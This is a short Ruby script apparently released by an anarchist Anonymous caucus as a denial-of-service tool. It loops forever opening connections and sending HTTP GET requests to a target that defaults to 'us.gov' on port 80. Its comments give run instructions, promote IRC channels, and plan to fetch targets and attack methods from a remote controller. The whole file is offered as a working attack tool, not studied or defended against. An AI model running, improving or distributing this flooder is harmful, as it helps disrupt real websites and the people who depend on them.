#!/usr/bin/ruby
# Anon Anarchist Action (an anarchist caucus inside anonymous)
# find us in the i2p shadownet IRC channels #aaa #AnonAnarchistAction #anonops
# https://aaa.status.net http://www.youtube.com/user/netanarchist

# HOW TO USE
# well for those few that may have no idea on how to run a shell script,  
# you need to install ruby1.9.x  apt-get install ruby1.9 
# then chmod 700 eriot.rb 
# and to run do: ruby eriot.rb or ./eriot.rb
# to stop for now just ctrl+c 


require 'socket'
require 'flags'

# this script will at some point connect to an account on a torrent or identi.ca/status.net or 
# maybe IRC to get the site name, port and DOS method, there will be a "alone" option were the
# activist can add their own information with out connecting to the head

# future use shoes for UI
# https://github.com/ashbb/shoes_tutorial_walkthrough

Flags.define_string(:target, "us.gov", "Here you add the site name")
Flags.define_int(:port, 80, "Target port")

if __FILE__ == $0

Flags.init
addr = Addrinfo.tcp(Flags.target,Flags.port)

# 10.times {  # here we mention the number of GET request as of now dissable
loop {
  addr.connect do |socket|
    socket.puts "GET / HTTP/1.0\r\n\r\n"
   #3.times { puts socket.gets } #uncoment to see result of query
  end
}

end
